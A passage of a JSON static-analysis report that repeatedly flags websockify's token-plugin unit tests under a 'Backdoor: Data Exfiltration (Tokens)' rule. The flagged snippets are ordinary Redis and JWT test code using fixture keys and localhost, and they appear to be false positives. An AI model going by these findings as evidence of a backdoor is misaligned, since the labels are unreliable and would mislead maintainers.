                    "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_empty_port_no_db_no_pass(self):\n        plugin = TokenRedis('127.0.0.1:')\n",
                    "rendered": {
                      "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_empty_port_no_db_no_pass(self):\n        plugin = TokenRedis('127.0.0.1:')\n",
                      "markdown": "`        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_empty_port_no_db_no_pass(self):\n        plugin = TokenRedis('127.0.0.1:')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 316,
                  "startColumn": 33,
                  "endLine": 316,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_empty_port_empty_db_no_pass(self):\n        plugin = TokenRedis('127.0.0.1::')\n",
                    "rendered": {
                      "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_empty_port_empty_db_no_pass(self):\n        plugin = TokenRedis('127.0.0.1::')\n",
                      "markdown": "`        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_empty_port_empty_db_no_pass(self):\n        plugin = TokenRedis('127.0.0.1::')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 308,
                  "startColumn": 33,
                  "endLine": 308,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, 'verysecret')\n\n    def test_src_with_host_empty_port_empty_db_empty_pass(self):\n        plugin = TokenRedis('127.0.0.1:::')\n",
                    "rendered": {
                      "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, 'verysecret')\n\n    def test_src_with_host_empty_port_empty_db_empty_pass(self):\n        plugin = TokenRedis('127.0.0.1:::')\n",
                      "markdown": "`        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, 'verysecret')\n\n    def test_src_with_host_empty_port_empty_db_empty_pass(self):\n        plugin = TokenRedis('127.0.0.1:::')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 300,
                  "startColumn": 33,
                  "endLine": 300,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 1234)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, 'verysecret')\n\n    def test_src_with_host_empty_port_empty_db_pass(self):\n        plugin = TokenRedis('127.0.0.1:::verysecret')\n",
                    "rendered": {
                      "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 1234)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, 'verysecret')\n\n    def test_src_with_host_empty_port_empty_db_pass(self):\n        plugin = TokenRedis('127.0.0.1:::verysecret')\n",
                      "markdown": "`        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 1234)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, 'verysecret')\n\n    def test_src_with_host_empty_port_empty_db_pass(self):\n        plugin = TokenRedis('127.0.0.1:::verysecret')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 292,
                  "startColumn": 33,
                  "endLine": 292,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 1234)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_port_db_pass(self):\n        plugin = TokenRedis('127.0.0.1:1234:2:verysecret')\n",
                    "rendered": {
                      "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 1234)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_port_db_pass(self):\n        plugin = TokenRedis('127.0.0.1:1234:2:verysecret')\n",
                      "markdown": "`        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 1234)\n        self.assertEqual(plugin._db, 2)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_port_db_pass(self):\n        plugin = TokenRedis('127.0.0.1:1234:2:verysecret')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 284,
                  "startColumn": 33,
                  "endLine": 284,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 1234)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_port_db(self):\n        plugin = TokenRedis('127.0.0.1:1234:2')\n",
                    "rendered": {
                      "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 1234)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_port_db(self):\n        plugin = TokenRedis('127.0.0.1:1234:2')\n",
                      "markdown": "`        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 1234)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_port_db(self):\n        plugin = TokenRedis('127.0.0.1:1234:2')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 276,
                  "startColumn": 33,
                  "endLine": 276,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_port(self):\n        plugin = TokenRedis('127.0.0.1:1234')\n",
                    "rendered": {
                      "text": "        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_port(self):\n        plugin = TokenRedis('127.0.0.1:1234')\n",
                      "markdown": "`        self.assertEqual(plugin._server, '127.0.0.1')\n        self.assertEqual(plugin._port, 6379)\n        self.assertEqual(plugin._db, 0)\n        self.assertEqual(plugin._password, None)\n\n    def test_src_with_host_port(self):\n        plugin = TokenRedis('127.0.0.1:1234')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 170,
                  "startColumn": 36,
                  "endLine": 170,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        private_key.import_from_pem(private_key_data)\n        public_key.import_from_pem(public_key_data)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(private_key)\n        jwe_token = jwt.JWT(header={\"alg\": \"RSA-OAEP\", \"enc\": \"A256CBC-HS512\"},\n                    claims=jwt_token.serialize())\n        jwe_token.make_encrypted_token(public_key)\n",
                    "rendered": {
                      "text": "        private_key.import_from_pem(private_key_data)\n        public_key.import_from_pem(public_key_data)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(private_key)\n        jwe_token = jwt.JWT(header={\"alg\": \"RSA-OAEP\", \"enc\": \"A256CBC-HS512\"},\n                    claims=jwt_token.serialize())\n        jwe_token.make_encrypted_token(public_key)\n",
                      "markdown": "`        private_key.import_from_pem(private_key_data)\n        public_key.import_from_pem(public_key_data)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(private_key)\n        jwe_token = jwt.JWT(header={\"alg\": \"RSA-OAEP\", \"enc\": \"A256CBC-HS512\"},\n                    claims=jwt_token.serialize())\n        jwe_token.make_encrypted_token(public_key)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 167,
                  "startColumn": 36,
                  "endLine": 167,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        public_key = jwk.JWK()\n        private_key_data = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        public_key_data = open(\"./tests/fixtures/public.pem\", \"rb\").read()\n        private_key.import_from_pem(private_key_data)\n        public_key.import_from_pem(public_key_data)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(private_key)\n",
                    "rendered": {
                      "text": "        public_key = jwk.JWK()\n        private_key_data = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        public_key_data = open(\"./tests/fixtures/public.pem\", \"rb\").read()\n        private_key.import_from_pem(private_key_data)\n        public_key.import_from_pem(public_key_data)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(private_key)\n",
                      "markdown": "`        public_key = jwk.JWK()\n        private_key_data = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        public_key_data = open(\"./tests/fixtures/public.pem\", \"rb\").read()\n        private_key.import_from_pem(private_key_data)\n        public_key.import_from_pem(public_key_data)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(private_key)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 167,
                  "startColumn": 8,
                  "endLine": 167,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        public_key = jwk.JWK()\n        private_key_data = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        public_key_data = open(\"./tests/fixtures/public.pem\", \"rb\").read()\n        private_key.import_from_pem(private_key_data)\n        public_key.import_from_pem(public_key_data)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(private_key)\n",
                    "rendered": {
                      "text": "        public_key = jwk.JWK()\n        private_key_data = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        public_key_data = open(\"./tests/fixtures/public.pem\", \"rb\").read()\n        private_key.import_from_pem(private_key_data)\n        public_key.import_from_pem(public_key_data)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(private_key)\n",
                      "markdown": "`        public_key = jwk.JWK()\n        private_key_data = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        public_key_data = open(\"./tests/fixtures/public.pem\", \"rb\").read()\n        private_key.import_from_pem(private_key_data)\n        public_key.import_from_pem(public_key_data)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(private_key)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 165,
                  "startColumn": 8,
                  "endLine": 165,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n        private_key = jwk.JWK()\n        public_key = jwk.JWK()\n        private_key_data = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        public_key_data = open(\"./tests/fixtures/public.pem\", \"rb\").read()\n        private_key.import_from_pem(private_key_data)\n        public_key.import_from_pem(public_key_data)\n",
                    "rendered": {
                      "text": "\n        private_key = jwk.JWK()\n        public_key = jwk.JWK()\n        private_key_data = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        public_key_data = open(\"./tests/fixtures/public.pem\", \"rb\").read()\n        private_key.import_from_pem(private_key_data)\n        public_key.import_from_pem(public_key_data)\n",
                      "markdown": "`\n        private_key = jwk.JWK()\n        public_key = jwk.JWK()\n        private_key_data = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        public_key_data = open(\"./tests/fixtures/public.pem\", \"rb\").read()\n        private_key.import_from_pem(private_key_data)\n        public_key.import_from_pem(public_key_data)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 163,
                  "startColumn": 8,
                  "endLine": 163,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    def test_asymmetric_jwe_token_plugin(self):\n        plugin = JWTTokenApi(\"./tests/fixtures/private.pem\")\n\n        private_key = jwk.JWK()\n        public_key = jwk.JWK()\n        private_key_data = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        public_key_data = open(\"./tests/fixtures/public.pem\", \"rb\").read()\n",
                    "rendered": {
                      "text": "    def test_asymmetric_jwe_token_plugin(self):\n        plugin = JWTTokenApi(\"./tests/fixtures/private.pem\")\n\n        private_key = jwk.JWK()\n        public_key = jwk.JWK()\n        private_key_data = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        public_key_data = open(\"./tests/fixtures/public.pem\", \"rb\").read()\n",
                      "markdown": "`    def test_asymmetric_jwe_token_plugin(self):\n        plugin = JWTTokenApi(\"./tests/fixtures/private.pem\")\n\n        private_key = jwk.JWK()\n        public_key = jwk.JWK()\n        private_key_data = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        public_key_data = open(\"./tests/fixtures/public.pem\", \"rb\").read()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 28,
                  "endLine": 123,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n        mock_time.return_value = 250\n",
                    "rendered": {
                      "text": "\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n        mock_time.return_value = 250\n",
                      "markdown": "`\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n        mock_time.return_value = 250\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 8,
                  "endLine": 122,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        plugin = JWTTokenApi(\"./tests/fixtures/public.pem\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n",
                    "rendered": {
                      "text": "        plugin = JWTTokenApi(\"./tests/fixtures/public.pem\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n",
                      "markdown": "`        plugin = JWTTokenApi(\"./tests/fixtures/public.pem\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 108,
                  "startColumn": 28,
                  "endLine": 108,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n        mock_time.return_value = 50\n",
                    "rendered": {
                      "text": "\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n        mock_time.return_value = 50\n",
                      "markdown": "`\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n        mock_time.return_value = 50\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 8,
                  "endLine": 107,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        plugin = JWTTokenApi(\"./tests/fixtures/public.pem\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n",
                    "rendered": {
                      "text": "        plugin = JWTTokenApi(\"./tests/fixtures/public.pem\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n",
                      "markdown": "`        plugin = JWTTokenApi(\"./tests/fixtures/public.pem\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 91,
                  "startColumn": 28,
                  "endLine": 91,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n        mock_time.return_value = 150\n",
                    "rendered": {
                      "text": "\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n        mock_time.return_value = 150\n",
                      "markdown": "`\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n        mock_time.return_value = 150\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 90,
                  "startColumn": 8,
                  "endLine": 90,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        plugin = JWTTokenApi(\"./tests/fixtures/public.pem\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n",
                    "rendered": {
                      "text": "        plugin = JWTTokenApi(\"./tests/fixtures/public.pem\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n",
                      "markdown": "`        plugin = JWTTokenApi(\"./tests/fixtures/public.pem\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\", 'nbf': 100, 'exp': 200 })\n        jwt_token.make_signed_token(key)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 77,
                  "startColumn": 28,
                  "endLine": 77,
                  "endColumn": 39,
                  "snippet": {
